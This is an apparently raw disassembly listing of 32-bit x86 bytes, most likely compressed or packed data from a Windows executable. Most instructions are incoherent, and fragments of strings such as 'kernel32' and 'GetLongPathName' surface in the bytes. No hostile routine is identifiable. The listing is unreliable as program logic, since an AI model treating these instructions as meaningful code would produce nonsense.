  413cc4:	20 ea                	and    %ch,%dl
  413cc6:	38 17                	cmp    %dl,(%edi)
  413cc8:	92                   	xchg   %eax,%edx
  413cc9:	e0 c6                	loopne 0x413c91
  413ccb:	86 58 f8             	xchg   %bl,-0x8(%eax)
  413cce:	c4 47 01             	les    0x1(%edi),%eax
  413cd1:	12 07                	adc    (%edi),%al
  413cd3:	02 9e b9 b6 d6 87    	add    -0x78294947(%esi),%bl
  413cd9:	03 1c e5 f4 65 3b 7c 	add    0x7c3b65f4(,%eiz,8),%ebx
  413ce0:	cc                   	int3
  413ce1:	f0 62 4b 90          	lock bound %ecx,-0x70(%ebx)
  413ce5:	30 09                	xor    %cl,(%ecx)
  413ce7:	15 20 f4 c0 3b       	adc    $0x3bc0f420,%eax
  413cec:	ec                   	in     (%dx),%al
  413ced:	ad                   	lods   %ds:(%esi),%eax
  413cee:	ea 90 67 c8 c9 f2 3c 	ljmp   $0x3cf2,$0xc9c86790
  413cf5:	f1                   	int1
  413cf6:	8b da                	mov    %edx,%ebx
  413cf8:	75 c6                	jne    0x413cc0
  413cfa:	61                   	popa
  413cfb:	a2 25 43 32 26       	mov    %al,0x26324325
  413d00:	57                   	push   %edi
  413d01:	5f                   	pop    %edi
  413d02:	72 24                	jb     0x413d28
  413d04:	74 2f                	je     0x413d35
  413d06:	61                   	popa
  413d07:	57                   	push   %edi
  413d08:	e8 8b c6 f4 4c       	call   0x4d360398
  413d0d:	0d c8 8b cd 55       	or     $0x55cd8bc8,%eax
  413d12:	4d                   	dec    %ebp
  413d13:	1f                   	pop    %ds
  413d14:	a2 16 6b 25 61       	mov    %al,0x61256b16
  413d19:	cf                   	iret
  413d1a:	16                   	push   %ss
  413d1b:	31 56 a3             	xor    %edx,-0x5d(%esi)
  413d1e:	6e                   	outsb  %ds:(%esi),(%dx)
  413d1f:	9a 89 1c 24 c2 a4 f0 	lcall  $0xf0a4,$0xc2241c89
  413d26:	26 3e d4 42          	es ds aam $0x42
  413d2a:	5d                   	pop    %ebp
  413d2b:	ce                   	into
  413d2c:	c5 2e                	lds    (%esi),%ebp
  413d2e:	78 cb                	js     0x413cfb
  413d30:	19 3a                	sbb    %edi,(%edx)
  413d32:	36 61                	ss popa
  413d34:	af                   	scas   %es:(%edi),%eax
  413d35:	d8 17                	fcoms  (%edi)
  413d37:	26 54                	es push %esp
  413d39:	c6                   	(bad)
  413d3a:	4f                   	dec    %edi
  413d3b:	f0 8e 9d 08 3d ad 2b 	lock mov 0x2bad3d08(%ebp),%ds
  413d42:	68 06 09 56 24       	push   $0x24560906
  413d47:	78 d8                	js     0x413d21
  413d49:	63 18                	arpl   %ebx,(%eax)
  413d4b:	28 08                	sub    %cl,(%eax)
  413d4d:	50                   	push   %eax
  413d4e:	70 a8                	jo     0x413cf8
  413d50:	50                   	push   %eax
  413d51:	21 6c 84 b6          	and    %ebp,-0x4a(%esp,%eax,4)
  413d55:	36 3d e0 28 f4 53    	ss cmp $0x53f428e0,%eax
  413d5b:	1d 20 98 a1 96       	sbb    $0x96a19820,%eax
  413d60:	ae                   	scas   %es:(%edi),%al
  413d61:	fc                   	cld
  413d62:	1c 07                	sbb    $0x7,%al
  413d64:	46                   	inc    %esi
  413d65:	97                   	xchg   %eax,%edi
  413d66:	b9 c6 18 c7 0b       	mov    $0xbc718c6,%ecx
  413d6b:	b0 26                	mov    $0x26,%al
  413d6d:	9a 3d 81 0f 97 b0 10 	lcall  $0x10b0,$0x970f813d
  413d74:	07                   	pop    %es
  413d75:	e2 1c                	loop   0x413d93
  413d77:	f8                   	clc
  413d78:	7f f5                	jg     0x413d6f
  413d7a:	10 f7                	adc    %dh,%bh
  413d7c:	c2 00 a3             	ret    $0xa300
  413d7f:	28 83 fa 08 72 23    	sub    %al,0x237208fa(%ebx)
  413d85:	81 fa c4 06 b4 d9    	cmp    $0xd9b406c4,%edx
  413d8b:	0a b3 07 01 75 19    	or     0x19750107(%ebx),%dh
  413d91:	35 3a 38 70 8b       	xor    $0x8b70383a,%eax
  413d96:	bc 00 66 c2 a4       	mov    $0xa4c26600,%esp
  413d9b:	e9 a6 88 8d 1d       	jmp    0x1dcec646
  413da0:	5d                   	pop    %ebp
  413da1:	0c c3                	or     $0xc3,%al
  413da3:	8a 9b 02 db cd 17    	mov    0x17cddb02(%ebx),%bl
  413da9:	94                   	xchg   %eax,%esp
  413daa:	90                   	nop
  413dab:	66 83 38 3f          	cmpw   $0x3f,(%eax)
  413daf:	2a e5                	sub    %ch,%ah
  413db1:	2d 9b a3 f6 66       	sub    $0x66f6a39b,%eax
  413db6:	81 38 18 24 06 01    	cmpl   $0x1062418,(%eax)
  413dbc:	08 95 78 b7 98 26    	or     %dl,0x2698b778(%ebp)
  413dc2:	29 ff                	sub    %edi,%edi
  413dc4:	15 47 20 e0 5b       	adc    $0x5be02047,%eax
  413dc9:	8b d3                	mov    %ebx,%edx
  413dcb:	44                   	inc    %esp
  413dcc:	e8 ec 2f 3a 08       	call   0x87b6dbd
  413dd1:	73 11                	jae    0x413de4
  413dd3:	d2 5d 20             	rcrb   %cl,0x20(%ebp)
  413dd6:	b6 fa                	mov    $0xfa,%dh
  413dd8:	08 31                	or     %dh,(%ecx)
  413dda:	89 48 05             	mov    %ecx,0x5(%eax)
  413ddd:	0c e7                	or     $0xe7,%al
  413ddf:	e6 9a                	out    %al,$0x9a
  413de1:	ed                   	in     (%dx),%eax
  413de2:	0c c3                	or     $0xc3,%al
  413de4:	3e 3a 14 06          	cmp    %ds:(%esi,%eax,1),%dl
  413de8:	3e 75 27             	jne,pt 0x413e12
  413deb:	b5 04                	mov    $0x4,%ch
  413ded:	98                   	cwtl
  413dee:	ed                   	in     (%dx),%eax
  413def:	30 3e                	xor    %bh,(%esi)
  413df1:	58                   	pop    %eax
  413df2:	85 e8                	test   %ebp,%eax
  413df4:	c5 09                	lds    (%ecx),%ecx
  413df6:	16                   	push   %ss
  413df7:	a0 2f 21 dc 89       	mov    0x89dc212f,%al
  413dfc:	01 9d c3 6a d4 18    	add    %ebx,0x18d46ac3(%ebp)
  413e02:	c4 92 1c 02 9f 81    	les    -0x7e60fde4(%edx),%edx
  413e08:	26 81 59 29 1c 8b be 	sbbl   $0x1ebe8b1c,%es:0x29(%ecx)
  413e0f:	1e 
  413e10:	e0 3f                	loopne 0x413e51
  413e12:	55                   	push   %ebp
  413e13:	cd 8d                	int    $0x8d
  413e15:	7d f0                	jge    0x413e07
  413e17:	51                   	push   %ecx
  413e18:	b9 04 01 59 76       	mov    $0x76590104,%ecx
  413e1d:	d0 a7 3b 30 d8 8d    	shlb   $1,-0x7227cfc5(%edi)
  413e23:	45                   	inc    %ebp
  413e24:	41                   	inc    %ecx
  413e25:	33 4c d7 fc          	xor    -0x4(%edi,%edx,8),%ecx
  413e29:	40                   	inc    %eax
  413e2a:	c3                   	ret
  413e2b:	66 73 41             	data16 jae 0x413e6f
  413e2e:	15 a9 e4 8d 55       	adc    $0x558de4a9,%eax
  413e33:	9b                   	fwait
  413e34:	1b 06                	sbb    (%esi),%eax
  413e36:	1d 29 82 31 20       	sbb    $0x20318229,%eax
  413e3b:	cb                   	lret
  413e3c:	17                   	pop    %ss
  413e3d:	ce                   	into
  413e3e:	a0 c1 5a 27 37       	mov    0x37275ac1,%al
  413e43:	44                   	inc    %esp
  413e44:	ca f0 76             	lret   $0x76f0
  413e47:	22 07                	and    (%edi),%al
  413e49:	19 57 b2             	sbb    %edx,-0x4e(%edi)
  413e4c:	7b b4                	jnp    0x413e02
  413e4e:	0b 3b                	or     (%ebx),%edi
  413e50:	d1 77 07             	shll   $1,0x7(%edi)
  413e53:	b3 9c                	mov    $0x9c,%bl
  413e55:	61                   	popa
  413e56:	83 fd dd             	cmp    $0xffffffdd,%ebp
  413e59:	0b 8f f9 22 70 03    	or     0x37022f9(%edi),%ecx
  413e5f:	66 2d e1 07          	sub    $0x7e1,%ax
  413e63:	66 ff c8             	dec    %ax
  413e66:	74 4c                	je     0x413eb4
  413e68:	eb b6                	jmp    0x413e20
  413e6a:	55                   	push   %ebp
  413e6b:	4f                   	dec    %edi
  413e6c:	b7 15                	mov    $0x15,%bh
  413e6e:	d6                   	salc
  413e6f:	67 cf                	addr16 iret
  413e71:	08 60 6f             	or     %ah,0x6f(%eax)
  413e74:	c9                   	leave
  413e75:	37                   	aaa
  413e76:	86 a3 b5 5f 0b 67    	xchg   %ah,0x670b5fb5(%ebx)
  413e7c:	0b 56 6d             	or     0x6d(%esi),%edx
  413e7f:	5b                   	pop    %ebx
  413e80:	d5 05                	aad    $0x5
  413e82:	31 d5                	xor    %edx,%ebp
  413e84:	47                   	inc    %edi
  413e85:	05 18 2f 58 00       	add    $0x582f18,%eax
  413e8a:	da 23                	fisubl (%ebx)
  413e8c:	2f                   	das
  413e8d:	bc 8b 18 d8 45       	mov    $0x45d8188b,%esp
  413e92:	34 a0                	xor    $0xa0,%al
  413e94:	44                   	inc    %esp
  413e95:	b7 05                	mov    $0x5,%bh
  413e97:	43                   	inc    %ebx
  413e98:	08 5d 37             	or     %bl,0x37(%ebp)
  413e9b:	c2 6e c9             	ret    $0xc96e
  413e9e:	0a 66 49             	or     0x49(%esi),%ah
  413ea1:	7c eb                	jl     0x413e8e
  413ea3:	27                   	daa
  413ea4:	56                   	push   %esi
  413ea5:	60                   	pusha
  413ea6:	0b 9b ec 18 50 53    	or     0x535018ec(%ebx),%ebx
  413eac:	4d                   	dec    %ebp
  413ead:	bd f1 aa f6 aa       	mov    $0xaaf6aaf1,%ebp
  413eb2:	f3 9b dd 16          	repz fstl (%esi)
  413eb6:	e4 db                	in     $0xdb,%al
  413eb8:	1a 84 fc fc 6b 04 93 	sbb    -0x6cfb9404(%esp,%edi,8),%al
  413ebf:	36 ab                	ss stos %eax,%es:(%edi)
  413ec1:	c6                   	(bad)
  413ec2:	da 03                	fiaddl (%ebx)
  413ec4:	b0 65                	mov    $0x65,%al
  413ec6:	08 5f cd             	or     %bl,-0x33(%edi)
  413ec9:	d9 8c cf b5 2c 27 1d 	(bad) 0x1d272cb5(%edi,%ecx,8)
  413ed0:	28 c4                	sub    %al,%ah
  413ed2:	26 23 28             	and    %es:(%eax),%ebp
  413ed5:	05 8d 68 05 3f       	add    $0x3f05688d,%eax
  413eda:	da a0 6d 07 ec 53    	fisubl 0x53ec076d(%eax)
  413ee0:	4d                   	dec    %ebp
  413ee1:	ec                   	in     (%dx),%al
  413ee2:	ee                   	out    %al,(%dx)
  413ee3:	0f d9 bc d6 00 b6 2a 	psubusw -0x27d54a00(%esi,%edx,8),%mm7
  413eea:	d8 
  413eeb:	a4                   	movsb  %ds:(%esi),%es:(%edi)
  413eec:	0c 9b                	or     $0x9b,%al
  413eee:	37                   	aaa
  413eef:	2e 0b 0f             	or     %cs:(%edi),%ecx
  413ef2:	ce                   	into
  413ef3:	33 02                	xor    (%edx),%eax
  413ef5:	3d 75 59 02 fb       	cmp    $0xfb025975,%eax
  413efa:	08 84 d8 e4 61 18 31 	or     %al,0x311861e4(%eax,%ebx,8)
  413f01:	f4                   	hlt
  413f02:	ff 9c cd 90 e4 f3 31 	lcall  *0x31f3e490(%ebp,%ecx,8)
  413f09:	f4                   	hlt
  413f0a:	91                   	xchg   %eax,%ecx
  413f0b:	42                   	inc    %edx
  413f0c:	93                   	xchg   %eax,%ebx
  413f0d:	2b f2                	sub    %edx,%esi
  413f0f:	90                   	nop
  413f10:	17                   	pop    %ss
  413f11:	c2 8b cb             	ret    $0xcb8b
  413f14:	94                   	xchg   %eax,%esp
  413f15:	07                   	pop    %es
  413f16:	43                   	inc    %ebx
  413f17:	2f                   	das
  413f18:	bc a3 6d 0e 1a       	mov    $0x1a0e6da3,%esp
  413f1d:	a6                   	cmpsb  %es:(%edi),%ds:(%esi)
  413f1e:	5f                   	pop    %edi
  413f1f:	5e                   	pop    %esi
  413f20:	65 82 83 41 96 ad 58 	addb   $0x65,%gs:0x58ad9641(%ebx)
  413f27:	65 
  413f28:	f8                   	clc
  413f29:	0a c4                	or     %ah,%al
  413f2b:	ac                   	lods   %ds:(%esi),%al
  413f2c:	3c 5f                	cmp    $0x5f,%al
  413f2e:	3b 59 62             	cmp    0x62(%ecx),%ebx
  413f31:	66 b9 af 66          	mov    $0x66af,%cx
  413f35:	20 f6                	and    %dh,%dh
  413f37:	96                   	xchg   %eax,%esi
  413f38:	48                   	dec    %eax
  413f39:	be 90 64 c4 8b       	mov    $0x8bc46490,%esi
  413f3e:	39 9e 71 58 43 b8    	cmp    %ebx,-0x47bca78f(%esi)
  413f44:	75 08                	jne    0x413f4e
  413f46:	a4                   	movsb  %ds:(%esi),%es:(%edi)
  413f47:	56                   	push   %esi
  413f48:	bb a3 58 0a f6       	mov    $0xf60a58a3,%ebx
  413f4d:	83 ec 10             	sub    $0x10,%esp
  413f50:	6b 0e 6c             	imul   $0x6c,(%esi),%ecx
  413f53:	e8 b4 a1 67 e0       	call   0xe0a8e10c
  413f58:	b9 55 bd 32 14       	mov    $0x1432bd55,%ecx
  413f5d:	0a 0a                	or     (%edx),%cl
  413f5f:	8f 82 b7 c0 35 88    	pop    -0x77ca3f49(%edx)
  413f65:	8d                   	lea    (bad),%edx
  413f66:	d1 f1                	shl    $1,%ecx
  413f68:	23 50 58             	and    0x58(%eax),%edx
  413f6b:	f0 d1 96 ed 23 43 1a 	lock rcll $1,0x1a4323ed(%esi)
  413f72:	ff 70 0c             	push   0xc(%eax)
  413f75:	02 08                	add    (%eax),%cl
  413f77:	04 8e                	add    $0x8e,%al
  413f79:	00 0f                	add    %cl,(%edi)
  413f7b:	1c 8a                	sbb    $0x8a,%al
  413f7d:	d8 96 6a c4 7d c4    	fcoms  -0x3b823b96(%esi)
  413f83:	8f 81 1b 85 70 48    	pop    0x4870851b(%ecx)
  413f89:	0f ff 44 53 44       	ud0    0x44(%ebx,%edx,2),%eax
  413f8e:	a0 76 69 62 90       	mov    0x90626976,%al
  413f93:	e1 22                	loope  0x413fb7
  413f95:	d1 98 2e 8f 49 07    	rcrl   $1,0x7498f2e(%eax)
  413f9b:	87 a6 c0 8c 7f e0    	xchg   %esp,-0x1f807340(%esi)
  413fa1:	14 f2                	adc    $0xf2,%al
  413fa3:	e0 bb                	loopne 0x413f60
  413fa5:	d4 d6                	aam    $0xd6
  413fa7:	b6 5d                	mov    $0x5d,%dh
  413fa9:	02 1b                	add    (%ebx),%bl
  413fab:	bc a9 38 10 7f       	mov    $0x7f1038a9,%esp
  413fb0:	1a 03                	sbb    (%ebx),%al
  413fb2:	eb 1c                	jmp    0x413fd0
  413fb4:	1c 78                	sbb    $0x78,%al
  413fb6:	7d 07                	jge    0x413fbf
  413fb8:	b0 a8                	mov    $0xa8,%al
  413fba:	f6 1b                	negb   (%ebx)
  413fbc:	d6                   	salc
  413fbd:	56                   	push   %esi
  413fbe:	d0 d1                	rcl    $1,%cl
  413fc0:	c7                   	(bad)
  413fc1:	ee                   	out    %al,(%dx)
  413fc2:	98                   	cwtl
  413fc3:	43                   	inc    %ebx
  413fc4:	35 21 0d f0 4e       	xor    $0x4ef00d21,%eax
  413fc9:	0b 9b 73 8d 46 d4    	or     -0x2bb9728d(%ebx),%ebx
  413fcf:	b4 0b                	mov    $0xb,%ah
  413fd1:	07                   	pop    %es
  413fd2:	13 8a b6 ed 02 85    	adc    -0x7afd124a(%edx),%ecx
  413fd8:	46                   	inc    %esi
  413fd9:	53                   	push   %ebx
  413fda:	19 46 02             	sbb    %eax,0x2(%esi)
  413fdd:	0f e8 05 06 6d 6f fd 	psubsb 0xfd6f6d06,%mm0
  413fe4:	e6 8c                	out    %al,$0x8c
  413fe6:	1b 30                	sbb    (%eax),%esi
  413fe8:	eb 02                	jmp    0x413fec
  413fea:	33 f6                	xor    %esi,%esi
  413fec:	68 f7 6d e8 14       	push   $0x14e86df7
  413ff1:	e4 6d                	in     $0x6d,%al
  413ff3:	87 6d bf             	xchg   %ebp,-0x41(%ebp)
  413ff6:	44                   	inc    %esp
  413ff7:	e4 99                	in     $0x99,%al
  413ff9:	f7 ff                	idiv   %edi
  413ffb:	3b 1d 74 56 83 11    	cmp    0x11835674,%ebx
  414001:	08 5d fa             	or     %bl,-0x6(%ebp)
  414004:	85 1f                	test   %ebx,(%edi)
  414006:	95                   	xchg   %eax,%ebp
  414007:	83 3b 1e             	cmpl   $0x1e,(%ebx)
  41400a:	35 89 5d e0 3b       	xor    $0x3be05d89,%eax
  41400f:	89 7d 1d             	mov    %edi,0x1d(%ebp)
  414012:	83 70 01 5d          	xorl   $0x5d,0x1(%eax)
  414016:	c2 19 97             	ret    $0x9719
  414019:	5e                   	pop    %esi
  41401a:	b3 2f                	mov    $0x2f,%bl
  41401c:	55                   	push   %ebp
  41401d:	7a 0f                	jp     0x41402e
  41401f:	af                   	scas   %es:(%edi),%eax
  414020:	55                   	push   %ebp
  414021:	dd db                	fstp   %st(3)
  414023:	4d                   	dec    %ebp
  414024:	f0 2b cf             	lock sub %edi,%ecx
  414027:	7e d0                	jle    0x413ff9
  414029:	22 f5                	and    %ch,%dh
  41402b:	85 90 69 e0 8b 55    	test   %edx,0x558be069(%eax)
  414031:	e4 1a                	in     $0x1a,%al
  414033:	ac                   	lods   %ds:(%esi),%al
  414034:	1c 27                	sbb    $0x27,%al
  414036:	70 2f                	jo     0x414067
  414038:	9f                   	lahf
  414039:	5e                   	pop    %esi
  41403a:	ff 0b                	decl   (%ebx)
  41403c:	55                   	push   %ebp
  41403d:	a3 76 d7 da cd       	mov    %eax,0xcddad776
  414042:	d1 87 56 43 ec 7d    	roll   $1,0x7dec4356(%edi)
  414048:	92                   	xchg   %eax,%edx
  414049:	04 46                	add    $0x46,%al
  41404b:	d3 1d 7b 5b 2a 2a    	rcrl   %cl,0x2a2a5b7b
  414051:	ec                   	in     (%dx),%al
  414052:	42                   	inc    %edx
  414053:	4d                   	dec    %ebp
  414054:	33 c9                	xor    %ecx,%ecx
  414056:	c9                   	leave
  414057:	18 f4                	sbb    %dh,%ah
  414059:	9d                   	popf
  41405a:	6d                   	insl   (%dx),%es:(%edi)
  41405b:	6d                   	insl   (%dx),%es:(%edi)
  41405c:	ec                   	in     (%dx),%al
  41405d:	50                   	push   %eax
  41405e:	16                   	push   %ss
  41405f:	cd 12                	int    $0x12
  414061:	62 ce 55             	(bad) {bad}
  414064:	80 06 2c             	addb   $0x2c,(%esi)
  414067:	dd 42 58             	fldl   0x58(%edx)
  41406a:	4d                   	dec    %ebp
  41406b:	29 4d d3             	sub    %ecx,-0x2d(%ebp)
  41406e:	b5 8b                	mov    $0x8b,%ch
  414070:	46                   	inc    %esi
  414071:	24 be                	and    $0xbe,%al
  414073:	ec                   	in     (%dx),%al
  414074:	00 43 b6             	add    %al,-0x4a(%ebx)
  414077:	65 02 57 ca          	add    %gs:-0x36(%edi),%dl
  41407b:	c1 60 51 04          	shll   $0x4,0x51(%eax)
  41407f:	b5 16                	mov    $0x16,%ch
  414081:	2b 14 99             	sub    (%ecx,%ebx,4),%edx
  414084:	ff 4f c2             	decl   -0x3e(%edi)
  414087:	06                   	push   %es
  414088:	ed                   	in     (%dx),%eax
  414089:	52                   	push   %edx
  41408a:	07                   	pop    %es
  41408b:	bb 6c 03 c3 53       	mov    $0x53c3036c,%ebx
  414090:	83 7d b8 7e          	cmpl   $0x7e,-0x48(%ebp)
  414094:	2e cc                	cs int3
  414096:	d5 0b                	aad    $0xb
  414098:	0b 85 08 96 48 4f    	or     0x4f489608(%ebp),%eax
  41409e:	36 7c 22             	ss jl  0x4140c3
  4140a1:	47                   	inc    %edi
  4140a2:	aa                   	stos   %al,%es:(%edi)
  4140a3:	95                   	xchg   %eax,%ebp
  4140a4:	ad                   	lods   %ds:(%esi),%eax
  4140a5:	2c 05                	sub    $0x5,%al
  4140a7:	00 6d 08             	add    %ch,0x8(%ebp)
  4140aa:	0a ed                	or     %ch,%ch
  4140ac:	59                   	pop    %ecx
  4140ad:	2b d8                	sub    %eax,%ebx
  4140af:	4e                   	dec    %esi
  4140b0:	83 6e c2 a0          	subl   $0xffffffa0,-0x3e(%esi)
  4140b4:	ff 0f                	decl   (%edi)
  4140b6:	5d                   	pop    %ebp
  4140b7:	31 e9                	xor    %ebp,%ecx
  4140b9:	e9 4f 75 e6 34       	jmp    0x3527b60d
  4140be:	18 63 fd             	sbb    %ah,-0x3(%ebx)
  4140c1:	c0 93 80 d8 c6 54 83 	rclb   $0x83,0x54c6d880(%ebx)
  4140c8:	0e                   	push   %cs
  4140c9:	04 1f                	add    $0x1f,%al
  4140cb:	73 ec                	jae    0x4140b9
  4140cd:	ba 35 a9 33 1b       	mov    $0x1b33a935,%edx
  4140d2:	74 49                	je     0x41411d
  4140d4:	f8                   	clc
  4140d5:	ec                   	in     (%dx),%al
  4140d6:	89 c8                	mov    %ecx,%eax
  4140d8:	75 aa                	jne    0x414084
  4140da:	c5 59 26             	lds    0x26(%ecx),%ebx
  4140dd:	54                   	push   %esp
  4140de:	42                   	inc    %edx
  4140df:	37                   	aaa
  4140e0:	57                   	push   %edi
  4140e1:	41                   	inc    %ecx
  4140e2:	a8 33                	test   $0x33,%al
  4140e4:	f6 22                	mulb   (%edx)
  4140e6:	07                   	pop    %es
  4140e7:	4b                   	dec    %ebx
  4140e8:	32 5c 53 4c          	xor    0x4c(%ebx,%edx,2),%bl
  4140ec:	08 56 37             	or     %dl,0x37(%esi)
  4140ef:	18 20                	sbb    %ah,(%eax)
  4140f1:	2c 5b                	sub    $0x5b,%al
  4140f3:	43                   	inc    %ebx
  4140f4:	04 03                	add    $0x3,%al
  4140f6:	59                   	pop    %ecx
  4140f7:	14 3e                	adc    $0x3e,%al
  4140f9:	4b                   	dec    %ebx
  4140fa:	0e                   	push   %cs
  4140fb:	10 e1                	adc    %ah,%cl
  4140fd:	85 0a                	test   %ecx,(%edx)
  4140ff:	7a 9e                	jp     0x41409f
  414101:	ff 43 f8             	incl   -0x8(%ebx)
  414104:	f7 5e 30             	negl   0x30(%esi)
  414107:	d0 28                	shrb   $1,(%eax)
  414109:	5e                   	pop    %esi
  41410a:	b4 ef                	mov    $0xef,%ah
  41410c:	f8                   	clc
  41410d:	e4 6a                	in     $0x6a,%al
  41410f:	1c f0                	sbb    $0xf0,%al
  414111:	27                   	daa
  414112:	e5 2a                	in     $0x2a,%eax
  414114:	bb 38 d0 81 7c       	mov    $0x7c81d038,%ebx
  414119:	24 10                	and    $0x10,%al
  41411b:	32 18                	xor    (%eax),%bl
  41411d:	68 07 54 75 06       	push   $0x6755407
  414122:	60                   	pusha
  414123:	b6 d7                	mov    $0xd7,%dh
  414125:	88 bb 0d 9d 1c 4f    	mov    %bh,0x4f1c9d0d(%ebx)
  41412b:	8b 15 10 98 52 b8    	mov    0xb8529810,%edx
  414131:	bc 15 78 19 3b       	mov    $0x3b197815,%esp
  414136:	42                   	inc    %edx
  414137:	04 61                	add    $0x61,%al
  414139:	04 08                	add    $0x8,%al
  41413b:	74 05                	je     0x414142
  41413d:	0c 75                	or     $0x75,%al
  41413f:	97                   	xchg   %eax,%edi
  414140:	88 d6                	mov    %dl,%dh
  414142:	58                   	pop    %eax
  414143:	0d 42 73 7f 11       	or     $0x117f7342,%eax
  414148:	e7 c3                	out    %eax,$0xc3
  41414a:	31 80 c7 88 eb 4d    	xor    %eax,0x4deb88c7(%eax)
  414150:	10 8a 10 c8 49 b0    	adc    %cl,-0x4fb637f0(%edx)
  414156:	c1 e9 5c             	shr    $0x5c,%ecx
  414159:	75 ef                	jne    0x41414a
  41415b:	e7 5e                	out    %eax,$0x5e
  41415d:	b0 9a                	mov    $0x9a,%al
  41415f:	09 78 eb             	or     %edi,-0x15(%eax)
  414162:	b5 eb                	mov    $0xeb,%ch
  414164:	ee                   	out    %al,(%dx)
  414165:	92                   	xchg   %eax,%edx
  414166:	68 84 47 8d 5f       	push   $0x5f8d4784
  41416b:	77 57                	ja     0x4141c4
  41416d:	18 60 ad             	sbb    %ah,-0x53(%eax)
  414170:	9d                   	popf
  414171:	40                   	inc    %eax
  414172:	68 94 0f 53 10       	push   $0x10530f94
  414177:	68 01 5c 28 6c       	push   $0x6c285c01
  41417c:	1d f4 46 33 74       	sbb    $0x743346f4,%eax
  414181:	2c e3                	sub    $0xe3,%al
  414183:	ae                   	scas   %es:(%edi),%al
  414184:	ea 8e bf 85 b1 3a 50 	ljmp   $0x503a,$0xb185bf8e
  41418b:	1d ff 55 f4 4a       	sbb    $0x4af455ff,%eax
  414190:	f7 e3                	mul    %ebx
  414192:	05 ac 15 11 2f       	add    $0x2f1115ac,%eax
  414197:	cb                   	lret
  414198:	37                   	aaa
  414199:	76 0d                	jbe    0x4141a8
  41419b:	53                   	push   %ebx
  41419c:	81 bf 6d 80 38 6d 38 	cmpl   $0x1780738,0x6d38806d(%edi)
  4141a3:	07 78 01 
  4141a6:	5c                   	pop    %esp
  4141a7:	dd 4b 42             	fisttpll 0x42(%ebx)
  4141aa:	f0 2d b8 0c d9 02    	lock sub $0x2d90cb8,%eax
  4141b0:	eb e8                	jmp    0x41419a
  4141b2:	a7                   	cmpsl  %es:(%edi),%ds:(%esi)
  4141b3:	b0 5d                	mov    $0x5d,%al
  4141b5:	d5 d4                	aad    $0xd4
  4141b7:	3b 0e                	cmp    (%esi),%ecx
  4141b9:	ea 8f 43 01 12 04 38 	ljmp   $0x3804,$0x1201438f
  4141c0:	1e                   	push   %ds
  4141c1:	3a d7                	cmp    %bh,%dl
  4141c3:	50                   	push   %eax
  4141c4:	06                   	push   %es
  4141c5:	ef                   	out    %eax,(%dx)
  4141c6:	c1 62 8d bf          	shll   $0xbf,-0x73(%edx)
  4141ca:	92                   	xchg   %eax,%edx
  4141cb:	8b f3                	mov    %ebx,%esi
  4141cd:	2b 75 fc             	sub    -0x4(%ebp),%esi
  4141d0:	8d bc 5c 67 58 48 f6 	lea    -0x9b7a799(%esp,%ebx,2),%edi
  4141d7:	7c 63                	jl     0x41423c
  4141d9:	98                   	cwtl
  4141da:	5d                   	pop    %ebp
  4141db:	38 bf c7 e1 4a 7c    	cmp    %bh,0x7c4ae1c7(%edi)
  4141e1:	a3 f1 d0 03 d6       	mov    %eax,0xd603d0f1
  4141e6:	42                   	inc    %edx
  4141e7:	01 a3 b3 12 cb 06    	add    %esp,0x6cb12b3(%ebx)
  4141ed:	ab                   	stos   %eax,%es:(%edi)
  4141ee:	92                   	xchg   %eax,%edx
  4141ef:	40                   	inc    %eax
  4141f0:	fa                   	cli
  4141f1:	32 01                	xor    (%ecx),%al
  4141f3:	33 b7 d9 03 c6 34    	xor    0x34c603d9(%edi),%esi
  4141f9:	40                   	inc    %eax
  4141fa:	b6 fe                	mov    $0xfe,%dh
  4141fc:	47                   	inc    %edi
  4141fd:	7c 17                	jl     0x414216
  4141ff:	6a b5                	push   $0xffffffb5
  414201:	30 73 cd             	xor    %dh,-0x33(%ebx)
  414204:	fc                   	cld
  414205:	67 53                	addr16 push %ebx
  414207:	1f                   	pop    %ds
  414208:	28 8d 52 bf b3 e2    	sub    %cl,-0x1d4c40ae(%ebp)
  41420e:	0b a0 8d 95 de 2c    	or     0x2cde958d(%eax),%esp
  414214:	d8 f7                	fdiv   %st(7),%st
  414216:	df 40 3d             	filds  0x3d(%eax)
  414219:	4d                   	dec    %ebp
  41421a:	7f 48                	jg     0x414264
  41421c:	c6 84 35 32 5c 20 55 	movb   $0xad,0x55205c32(%ebp,%esi,1)
  414223:	ad 
  414224:	07                   	pop    %es
  414225:	36 3b 40 ef          	cmp    %ss:-0x11(%eax),%eax
  414229:	36 40                	ss inc %eax
  41422b:	03 61 48             	add    0x48(%ecx),%esp
  41422e:	30 1b                	xor    %bl,(%ebx)
  414230:	b8 df c6 cd 5f       	mov    $0x5fcdc6df,%eax
  414235:	19 ff                	sbb    %edi,%edi
  414237:	41                   	inc    %ecx
  414238:	c0 c0 fa             	rol    $0xfa,%al
  41423b:	bb 6b 65 72 6e       	mov    $0x6e72656b,%ebx
  414240:	65 6c                	gs insb (%dx),%es:(%edi)
  414242:	33 32                	xor    (%edx),%esi
  414244:	ff 37                	push   (%edi)
  414246:	f8                   	clc
  414247:	f1                   	int1
  414248:	2e 64 6c             	cs fs insb (%dx),%es:(%edi)
  41424b:	6c                   	insb   (%dx),%es:(%edi)
  41424c:	4b                   	dec    %ebx
  41424d:	47                   	inc    %edi
  41424e:	65 56                	gs push %esi
  414250:	6f                   	outsl  %ds:(%esi),(%dx)
  414251:	6e                   	outsb  %ds:(%esi),(%dx)
  414252:	67 50                	addr16 push %eax
  414254:	61                   	popa
  414255:	74 68                	je     0x4142bf
  414257:	4e                   	dec    %esi
  414258:	61                   	popa
  414259:	6d                   	insl   (%dx),%es:(%edi)
  41425a:	18 ce                	sbb    %cl,%dh
  41425c:	11 de                	adc    %ebx,%esi
  41425e:	65 41                	gs inc %ecx
  414260:	13 a7 e0 fe a6 cf    	adc    -0x30590120(%edi),%esp
  414266:	02 de                	add    %dh,%bl
  414268:	20 7c e3 6a          	and    %bh,0x6a(%ebx,%eiz,8)
  41426c:	3e c6 45 c0 56       	movb   $0x56,%ds:-0x40(%ebp)
  414271:	a8 ae                	test   $0xae,%al
  414273:	ee                   	out    %al,(%dx)
  414274:	df f8                	(bad)
  414276:	9c                   	pushf
  414277:	6f                   	outsl  %ds:(%esi),(%dx)
  414278:	00 d8                	add    %bl,%al
  41427a:	49                   	dec    %ecx
  41427b:	96                   	xchg   %eax,%esi
  41427c:	0b ff                	or     %edi,%edi
  41427e:	64 49                	fs dec %ecx
  414280:	01 74 1e 1d          	add    %esi,0x1d(%esi,%ebx,1)
  414284:	36 80 84 1c 80 1d 72 	addb   $0xec,%ss:0x5721d80(%esp,%ebx,1)
  41428b:	05 ec 
